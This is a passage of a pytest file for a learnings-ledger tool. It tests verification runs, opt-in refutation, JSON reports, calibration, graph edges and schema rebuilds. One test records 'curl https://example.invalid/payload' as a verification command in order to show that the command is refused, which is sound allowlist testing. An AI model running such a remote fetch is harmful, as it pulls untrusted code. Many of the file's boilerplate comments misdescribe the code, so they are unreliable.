    """A refuted entry is nobody's advice, so its staleness is not measured.

    Verifying it again would append a second refutation on every run, which is
    ledger noise saying nothing new.

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    # Preserve the external command representation and its observed completion outcome.
    command = script(store, "ok.py", "pass\n")
    # Compute first using record for later test a retired learning is not verified logic.
    first = record(store, verification=command)
    learn.append_event(store, "refute", "S-2", {"ref": first, "why": "wrong"})
    # Compute connection using learn.sync for later test a retired learning is not verified
    # Details: logic.
    connection = learn.sync(store)
    assert learn.verify(store, connection, execute=True) == []
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()


def test_a_failure_refutes_only_when_asked(store: learn.Store) -> None:
    """The refutation is a second opt-in, because refuting is a one-way door.

    An executing run alone leaves the ledger exactly as it found it; only
    `--refute-failures` appends, and then as the existing `refute` event so the
    fold and the schema are untouched.
    """
    # Preserve the external command representation and its observed completion outcome.
    command = script(store, "bad.py", "raise SystemExit(2)\n")
    # Compute first using record for later test a failure refutes only when asked logic.
    first = record(store, verification=command)
    # Compute before using len for later test a failure refutes only when asked logic.
    before = len(learn.read_ledger(store))

    assert learn.main(["--root", str(store.root), "verify", "--execute"]) == 0
    assert len(learn.read_ledger(store)) == before
    assert states(store)[first] == "candidate"

    assert learn.main(
        ["--root", str(store.root), "verify", "--execute", "--refute-failures"]
    ) == 0
    # Compute events using learn.read ledger for later test a failure refutes only when asked
    # Details: logic.
    events = learn.read_ledger(store)
    assert events[-1]["kind"] == "refute"
    assert events[-1]["payload"]["ref"] == first
    assert "exited 2" in events[-1]["payload"]["why"]
    assert states(store)[first] == "refuted"


def test_a_passing_verification_records_nothing(store: learn.Store) -> None:
    """Success is not evidence, and is never written down.

    Recording a success would be the reflexive "helped" this database refuses to
    collect: a metric biased toward success is worse than no metric.
    """
    # Preserve the external command representation and its observed completion outcome.
    command = script(store, "ok.py", "pass\n")
    record(store, verification=command)
    # Compute before using len for later test a passing verification records nothing logic.
    before = len(learn.read_ledger(store))
    assert learn.main(
        ["--root", str(store.root), "verify", "--execute", "--refute-failures"]
    ) == 0
    assert len(learn.read_ledger(store)) == before


def test_refuting_without_executing_is_refused(store: learn.Store) -> None:
    """Nothing ran, so there is nothing to refute; the command says so and stops."""
    assert learn.main(["--root", str(store.root), "verify", "--refute-failures"]) == 1


def test_only_a_real_failure_refutes(store: learn.Store) -> None:
    """A refusal or a missing program says the check could not run here.

    That is a fact about this machine, not about the claim, so it must not retire
    an entry -- which is the difference between measuring staleness and
    manufacturing it.
    """
    # Each results element is one non-executed verification outcome in assertion order.
    results = [
        learn.VerifyResult("L-0001", "curl x", "refused", "not allowlisted"),
        learn.VerifyResult("L-0002", "doxygen x", "unavailable", "not installed"),
        learn.VerifyResult("L-0003", "python x.py", "skipped", "would run"),
    ]
    assert learn.refute_failures(store, results, "S-9") == []
    assert learn.read_ledger(store) == []


def test_the_verify_report_has_a_machine_readable_form(
        capsys: pytest.CaptureFixture[str], store: learn.Store) -> None:
    """`--json` carries the outcome and the exit status, for a gate to read."""
    record(store, verification=script(store, "bad.py", "raise SystemExit(4)\n"))
    assert learn.main(["--root", str(store.root), "verify", "--execute", "--json"]) == 0
    # Each payload element is one decoded verification-result record in report order.
    payload = json.loads(capsys.readouterr().out)
    # Select r as the current element from payload] == [("failed", 4)] while test the verify
    # Details: report has a machine readable form preserves traversal order.
    assert [(r["outcome"], r["code"]) for r in payload] == [("failed", 4)]


def test_a_machine_read_report_still_carries_the_refusals_and_the_caveat(
        capsys: pytest.CaptureFixture[str], store: learn.Store) -> None:
    """`--json` keeps stdout parsable without going quiet about what it refused.

    A gate reads this form, and a gate is exactly the reader that would record
    "verified" over a run where nothing was allowed to start. The refusal and the
    caveat therefore go to stderr, where they cost the parser nothing.
    """
    record(store, verification="curl https://example.invalid/payload")
    assert learn.main(["--root", str(store.root), "verify", "--json"]) == 0
    # Compute captured using capsys.readouterr for later test a machine read report still
    # Details: carries the refusals and the caveat logic.
    captured = capsys.readouterr()
    # Select r as the current element from json.loads(captured.out)] == ["refused"] while test a
    # Details: machine read report still carries the refusals and the caveat preserves traversal
    # Details: order.
    assert [r["outcome"] for r in json.loads(captured.out)] == ["refused"]
    assert "REFUSED" in captured.err
    assert "does not prove the claim" in captured.err


def test_the_report_states_what_a_pass_does_not_prove(capsys: pytest.CaptureFixture[str],
                                                      store: learn.Store) -> None:
    """The caveat is printed with every report, where a reader cannot miss it.

    A green verification pass invites the reading that the claims were confirmed.
    They were not: the command is a proxy the recording agent chose.
    """
    record(store, verification=script(store, "ok.py", "pass\n"))
    assert learn.main(["--root", str(store.root), "verify"]) == 0
    assert "does not prove the claim" in capsys.readouterr().out


# ------------------------------------------------------------ generated views


def test_the_views_are_deterministic(store: learn.Store) -> None:
    """Rendering twice from one state produces identical text.

    The views are committed, so any wall-clock or set-ordering leak would show up
    as a diff nobody caused.

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    record(store)
    # Compute connection using learn.sync for later test the views are deterministic logic.
    connection = learn.sync(store)
    # Compute config using store.config for later test the views are deterministic logic.
    config = store.config()
    # Compute as of using dt.date for later test the views are deterministic logic.
    as_of = dt.date(2026, 8, 18)
    assert learn.render_index(connection, config) == learn.render_index(connection, config)
    assert (learn.render_calibration(connection, config, as_of)
            == learn.render_calibration(connection, config, as_of))
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()


def test_an_empty_database_explains_the_first_run(store: learn.Store) -> None:
    """With nothing recorded, the report gives the bootstrap protocol.

    Precision cannot be measured before anything was retrieved, so the empty
    report has to say what to measure instead rather than print a zero.

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    # Compute connection using learn.sync for later test an empty database explains the first
    # Details: run logic.
    connection = learn.sync(store)
    # Hold the decoded checker report mapping for typed summary and diagnostic extraction.
    report = learn.render_calibration(connection, store.config(), dt.date(2026, 8, 18))
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()
    assert "First-run protocol" in report
    assert "would have helped at the start" in report


def test_calibration_reports_precision(store: learn.Store) -> None:
    """Precision is helped outcomes over all reported outcomes.

    One of each gives 50%, which pins both the ratio and the rendering.

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    # Compute first using record for later test calibration reports precision logic.
    first = record(store)
    learn.append_event(store, "use", "S-2", {"ref": first, "outcome": "helped"})
    learn.append_event(store, "use", "S-3", {"ref": first, "outcome": "noise"})
    # Compute connection using learn.sync for later test calibration reports precision logic.
    connection = learn.sync(store)
    # Hold the decoded checker report mapping for typed summary and diagnostic extraction.
    report = learn.render_calibration(connection, store.config(), dt.date(2026, 8, 18))
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()
    assert "**50%**" in report


def test_a_parameter_change_needs_a_reason(store: learn.Store) -> None:
    """A setting edit reports the value it displaced beside the new one.

    That pair is what the audit event carries; without the old value a recorded
    reason cannot be checked against what actually changed.
    """
    # Compute changed using learn. apply settings for later test a parameter change needs a
    # Details: reason logic.
    changed = learn._apply_settings(store, ["retrieval.max_learnings=3"])
    assert changed["retrieval.max_learnings"] == ["8", "3"]
    assert store.config()["retrieval"]["max_learnings"] == 3


def test_calibrate_refuses_a_change_without_a_reason(store: learn.Store) -> None:
    """The public calibration command leaves both config and ledger untouched.

    @param store isolated learning store
    """
    # Compute before using store.config path.read bytes for later test calibrate refuses a
    # Details: change without a reason logic.
    before = store.config_path.read_bytes()
    # Capture status as the completed test calibrate refuses a change without a reason outcome
    # Details: for subsequent validation or publication.
    status = learn.main([
        "--root", str(store.root), "calibrate",
        "--set", "retrieval.max_learnings=3",
    ])
    assert status == 1
    assert store.config_path.read_bytes() == before
    assert not store.ledger.exists()


def test_an_unknown_parameter_is_refused(store: learn.Store) -> None:
    """A name matching no line in config.toml raises rather than moving nothing."""
    # Confine the acquired resource to this operation and release it on every exit.
    with pytest.raises(learn.LearnError, match="no setting named"):
        learn._apply_settings(store, ["retrieval.nonsense=1"])


# ---------------------------------------------------------------- graph layer


def test_learnings_surface_as_graph_edges(store: learn.Store) -> None:
    """A link becomes an edge from the entry to the rule it is about.

    That is how a reading plan picks up what was learned about the rules it
    already selected, without the static graph being rewritten.

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    record(store, links=[{"relation": "learned_about", "node": "ARCH-003"}])
    # Publish the externally visible effect after all required inputs are ready.
    learn.sync(store).close()
    # Compute overlay using list for later test learnings surface as graph edges logic.
    overlay = list(learn.graph_overlay(store))
    # Select o as the current element from overlay] == [("L-0001", "learned_about", "ARCH-003")]
    # Details: while test learnings surface as graph edges preserves traversal order.
    assert [(o[0], o[2], o[3]) for o in overlay] == [("L-0001", "learned_about", "ARCH-003")]


def test_a_retired_learning_leaves_the_overlay(store: learn.Store) -> None:
    """Refuting an entry withdraws its edges, so navigation stops citing it.

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    # Compute first using record for later test a retired learning leaves the overlay logic.
    first = record(store, links=[{"relation": "learned_about", "node": "ARCH-003"}])
    learn.append_event(store, "refute", "S-2", {"ref": first, "why": "no"})
    # Publish the externally visible effect after all required inputs are ready.
    learn.sync(store).close()
    assert list(learn.graph_overlay(store)) == []


def test_the_overlay_is_silent_without_a_database(tmp_path: Path) -> None:
    """No database yields no edges rather than an error.

    The overlay is optional to its callers: navigation must work in a checkout
    where nobody has run sync.
    """
    assert list(learn.graph_overlay(learn.Store(tmp_path))) == []


# ------------------------------------------------------------------- schema


def test_the_schema_records_its_version(store: learn.Store) -> None:
    """A freshly built database stamps the version it was built under.

    Without the stamp there is no way to tell a current database from one left
    behind by an older checkout.

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    # Compute connection using learn.sync for later test the schema records its version logic.
    connection = learn.sync(store)
    # Compute row using connection.execute for later test the schema records its version logic.
    row = connection.execute("SELECT version, applied_ledger_seq FROM schema_version").fetchone()
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()
    assert row["version"] == learn.SCHEMA_VERSION


def test_a_prior_version_database_is_rebuilt_not_patched(store: learn.Store) -> None:
    """A database at an older version is discarded and rebuilt, not migrated.

    This is the whole migration story. The database is derived, so it holds
    nothing worth preserving; the ledger is what a schema change must stay
    compatible with (API-012).

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    record(store)
    # Publish the externally visible effect after all required inputs are ready.
    learn.sync(store).close()
    # Compute connection using sqlite3.connect for later test a prior version database is
    # Details: rebuilt not patched logic.
    connection = sqlite3.connect(store.db)
    connection.execute("UPDATE schema_version SET version = 0")
    connection.execute("DELETE FROM learning")
    # Publish the externally visible effect after all required inputs are ready.
    connection.commit()
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()

    # Compute connection using learn.sync for later test a prior version database is rebuilt not
    # Details: patched logic.
    connection = learn.sync(store)
    # Compute row using connection.execute for later test a prior version database is rebuilt
    # Details: not patched logic.
    row = connection.execute("SELECT COUNT(*) n FROM learning").fetchone()
    # Compute version using connection.execute for later test a prior version database is
    # Details: rebuilt not patched logic.
    version = connection.execute("SELECT version FROM schema_version").fetchone()[0]
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()
    assert row["n"] == 1
    assert version == learn.SCHEMA_VERSION


# Enter the command-line boundary only when this module is executed directly.
if __name__ == "__main__":
    # Propagate the localized failure so callers cannot mistake it for success.
    raise SystemExit(pytest.main([__file__, "-q"]))
